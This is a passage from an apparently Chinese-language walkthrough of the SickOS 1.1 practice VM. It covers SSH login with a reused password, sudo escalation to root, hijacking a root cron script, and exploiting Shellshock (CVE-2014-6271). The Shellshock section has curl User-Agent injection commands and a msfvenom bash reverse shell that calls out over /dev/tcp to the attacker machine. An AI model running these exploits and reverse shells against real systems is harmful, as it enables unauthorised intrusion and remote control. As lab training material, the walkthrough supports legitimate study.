// Rough interval in seconds at which poormans cron should trigger.
// No traffic == no poormans cron run.
define('POORMANSCRON_INTERVAL', 3600);

// How long should the browser remember logged in user?
// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
// Default: 1800 (30 minutes)
define ('COOKIE_LIFE', 1800);  // 30 minutes

// Can registered users login to backend using their email address?
// Default: false
define ('ALLOW_LOGIN_WITH_EMAIL', false);

// Should Wolf CMS block login ability on invalid password provided?
// Default: true
define ('DELAY_ON_INVALID_LOGIN', true);

// How long should the login blockade last?
// Default: 30 seconds
define ('DELAY_ONCE_EVERY', 30); // 30 seconds

// First delay starts after Nth failed login attempt
// Default: 3
define ('DELAY_FIRST_AFTER', 3);

// Secure token expiry time (prevents CSRF attacks, etc.)
// If backend user does nothing for this time (eg. click some link) 
// his token will expire with appropriate notification
// Default: 900 (15 minutes)
define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
```

尝试root/john@123 发现无果，使用sickos/john@123 发现可以成功登入

```shell
┌──(kali㉿kali)-[~]
└─$ ssh sickos@192.168.8.103  
The authenticity of host '192.168.8.103 (192.168.8.103)' can't be established.
ECDSA key fingerprint is: SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.8.103' (ECDSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sickos@192.168.8.103's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat Jun 27 09:22:57 IST 2026

  System load:  0.0               Processes:           115
  Usage of /:   4.5% of 28.42GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.8.103
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Sep 22 08:32:44 2015
-bash-4.2$ ls


```

sudo -l查看开放了哪些权限�?

```shell
-bash-4.2$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL

```

sudo 开放了全部权限 下面使用sudo ls /root 查看root目录下的文件�?

```
-bash-4.2$ sudo ls /root
a0216ea4d51874464078c618298b1367.txt
```

查看�?sudo cat /root/a0216ea4d51874464078c618298b1367.txt

```
-bash-4.2$ sudo cat /root/a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


-bash-4.2$ 

```

### 3.1解法2 www-data->root  定时脚本反弹shell 

在此之前，先要升级到交互式shell , 查看定时计划�?

```
www-data@SickOs:/etc$ echo 1
1
www-data@SickOs:/etc$ cd /etc/cron.d/
www-data@SickOs:/etc/cron.d$ ls
automate  php5
www-data@SickOs:/etc/cron.d$ cat automake
cat: automake: No such file or directory
www-data@SickOs:/etc/cron.d$ cd automate
bash: cd: automate: Not a directory
www-data@SickOs:/etc/cron.d$ cat automate

* * * * * root /usr/bin/python /var/www/connect.py
          www-data@SickOs:/etc/cron.d$ 
```

root身份执行  /var/www/connect.py 接下来覆�?/var/www/connect.py 反弹shell

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvp 8888
listening on [any] 8888 ...
connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 50636
/bin/sh: 0: can't access tty; job control turned off

# bash -p

ls
a0216ea4d51874464078c618298b1367.txt
id  
uid=0(root) gid=0(root) groups=0(root)
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

### 4.Web的另一种思路：利用shellshock漏洞获取webshell

我们在目录扫描的过程中发现了/cgi-bin/bin ,  这时我们需要用到nikto 去扫描一下：

+ ```shell
  ╭─ /home/kali ······························································································································································· х INT with root@kali at 21:04:49 ─�?
  ╰─�?nikto -h 192.168.8.103 -useproxy http://192.168.8.103:3128                                                                                                                                                 
  
  - Nikto v2.5.0
  
  ---------------------------------------------------------------------------
  
  + Target IP:          192.168.8.103
  + Target Hostname:    192.168.8.103
  + Target Port:        80
  + Proxy:              192.168.8.103:3128
  + Start Time:         2026-06-27 21:04:55 (GMT-4)
  
  ---------------------------------------------------------------------------
  
  + Server: Apache/2.2.22 (Ubuntu)
  + /: Retrieved via header: 1.0 localhost (squid/3.1.19).
  + /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
  + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
  + /: Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128.
  + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
  + /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
  + : Server banner changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19'.
  + /: Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_URL 0.
  + Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
  + /index: Uncommon header 'tcn' found, with contents: list.
  + /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
  + /cgi-bin/status: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
  + /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
  ```

  发现存在CVE-2014-6271 

{% asset_img image-20260628091603757.png image-20260628091603757 %}

简单来说就�?Shell在处理环境变量时，错误地将函数定义后面的字符串也当作命令来执行了

```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

上面的POC�?创建一个临时的环境变量�?) { :;}; 是空函数的写法，bash 会解析函数之外的内容 即echo vulnerable' bash -c "echo test"

下面针对Linux给出的路径，使用curl进行进行手动验证，在实战中也推荐使用手动或者单独的漏洞脚本，否则会暴露出特�?

```shell
╭─ /home/kali ····································································································································································· with root@kali at 21:33:07 ─�?
╰─�?curl -H "User-Agent: () { :; }; echo; /bin/ls -la /" http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128                                                                                 ─�?
total 84
drwxr-xr-x  22 root root  4096 Sep 22  2015 .
drwxr-xr-x  22 root root  4096 Sep 22  2015 ..
drwxr-xr-x   2 root root  4096 Sep 22  2015 bin
drwxr-xr-x   3 root root  4096 Sep 22  2015 boot
drwxr-xr-x  14 root root  3920 Jun 27 07:38 dev
drwxr-xr-x  90 root root  4096 Jun 27 07:38 etc
drwxr-xr-x   3 root root  4096 Sep 22  2015 home
lrwxrwxrwx   1 root root    34 Sep 22  2015 initrd.img -> /boot/initrd.img-3.11.0-15-generic
drwxr-xr-x  17 root root  4096 Sep 22  2015 lib
drwx------   2 root root 16384 Sep 22  2015 lost+found
drwxr-xr-x   4 root root  4096 Sep 22  2015 media
drwxr-xr-x   2 root root  4096 Jan 10  2014 mnt
drwxr-xr-x   2 root root  4096 Dec  6  2015 opt
dr-xr-xr-x 124 root root     0 Jun 27 07:38 proc
drwx------   3 root root  4096 Dec  6  2015 root
drwxr-xr-x  16 root root   620 Jun 27 09:23 run
drwxr-xr-x   2 root root  4096 Sep 22  2015 sbin
drwxr-xr-x   2 root root  4096 Mar  5  2012 selinux
drwxr-xr-x   2 root root  4096 Sep 22  2015 srv
dr-xr-xr-x  13 root root     0 Jun 27 07:37 sys
drwxrwxrwt   2 root root  4096 Jun 27 12:39 tmp
drwxr-xr-x  10 root root  4096 Sep 22  2015 usr
drwxr-xr-x  13 root root  4096 Jun 26 09:13 var
lrwxrwxrwx   1 root root    30 Sep 22  2015 vmlinuz -> boot/vmlinuz-3.11.0-15-generic
```

使用msfvenom 生成反向shell 

```shell
╭─ /home/kali ····································································································································································· with root@kali at 21:41:12 ─�?
╰─�?msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport = 443 -f raw                                                                                                                                   ─�?
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
Error: One or more options failed to validate: LPORT.

╭─ /home/kali ····························································································································································· took 4s with root@kali at 21:41:59 ─�?
╰─�?msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport=443 -f raw                                                                                                                                     ─�?
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 76 bytes
bash -c '0<&154-;exec 154<>/dev/tcp/192.168.8.114/443;sh <&154 >&154 2>&154'
```

这里有一点要注意 sh 要替换为/bin/bash

```shell
╭─ /home/kali ······································ х INT with root@kali at 21:43:03 ─�?
╰─�?curl -H "User-Agent: () { :; }; echo; 0<&154-;exec 154<>/dev/tcp/192.168.8.114/443;/bin/bash <&154 >&154 2>&154 " http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128
```

成功反弹�?

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvp 443 
listening on [any] 443 ...
connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 37737
ls
status
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

